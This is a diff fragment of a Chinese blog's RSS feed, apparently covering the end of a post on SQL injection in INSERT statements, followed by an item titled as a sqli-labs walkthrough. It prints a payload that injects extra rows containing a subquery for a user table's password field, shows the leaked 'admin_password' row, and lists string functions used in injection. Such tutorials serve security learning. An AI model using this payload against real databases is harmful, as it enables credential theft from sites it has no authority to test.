+&lt;p&gt;sql 语句是&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;,1,1),(3,4,(select pwd from wp_user limit 1),1)#&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;此时表&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;title&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;content&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;time&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;this is title&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;aaaaaaaaa’,&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;4&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;admin_password&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;可发现新加了两行，成功注入&lt;/p&gt;
+&lt;p&gt;mid () 函数&lt;br&gt;
+ select mid (column_name,start,length)&lt;br&gt;
+ right () 函数&lt;br&gt;
+从指定字符串的&lt;mark&gt;右侧&lt;/mark&gt;提取给定长度的字符&lt;br&gt;
+ select right (column_name,length)&lt;br&gt;
+ substr () 函数&lt;br&gt;
+与 mid () 一样&lt;br&gt;
+ reverse () 函数&lt;br&gt;
+反转字符串&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://hq185187.github.io/2023/04/28/sqli-labs/</guid>
             <title>Sqli-labs靶场通关</title>
